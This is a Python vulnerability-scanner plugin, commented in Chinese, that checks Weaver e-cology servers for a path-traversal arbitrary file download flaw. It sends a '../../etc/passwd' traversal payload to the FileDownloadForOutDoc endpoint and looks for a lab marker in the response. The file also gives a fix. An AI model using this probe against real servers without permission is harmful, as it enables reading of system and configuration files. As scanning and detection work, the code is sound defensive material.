# 泛微 e-cology 任意文件下载路径穿越
# 漏洞原因：/weaver/weaver.file.FileDownloadForOutDoc 的 file 参数未过滤，
#   攻击者可构造 ../../etc/passwd 路径穿越，下载服务器任意文件（如 /etc/passwd、配置文件）。
# 本插件仅做存在性验证：GET 带 ../etc/passwd 探针，检测响应签名判定接口是否可达。
# 注意：该接口与 file_upload 插件路径相同，但 file_upload 为 POST 上传，本插件为 GET 下载。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url

# 漏洞命中签名（与 lab/weaver_server.py vuln 模式一致）
FILE_DOWNLOAD_MARKER = 'weaver-file-download-confirmed'


class WeaverFileDownloadPlugin(PluginBase):
    name = '泛微 e-cology 任意文件下载'
    cve = ''
    severity = 'high'
    category = 'vuln'
    description = '/weaver/weaver.file.FileDownloadForOutDoc 的 file 参数未过滤，可路径穿越下载任意文件'
    fix = '对 file 参数做白名单校验与路径归一化；禁止包含 .. 与绝对路径；下载接口强制鉴权'

    def verify(self, target, session):
        url = join_url(target, '/weaver/weaver.file.FileDownloadForOutDoc')
        # 路径穿越探针：尝试下载 /etc/passwd（仅探测，不获取敏感内容）
        params = {'file': '../../etc/passwd'}
        try:
            resp = session.get(url, params=params)
        except Exception as e:
            print(no('泛微任意文件下载（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        if FILE_DOWNLOAD_MARKER in text:
            print(ok('存在泛微 e-cology 任意文件下载漏洞'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含文件下载穿越特征：{FILE_DOWNLOAD_MARKER}',
                fix=self.fix,
            )
        print(no('不存在泛微 e-cology 任意文件下载漏洞'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含文件下载穿越特征（接口不可达或已修复）')
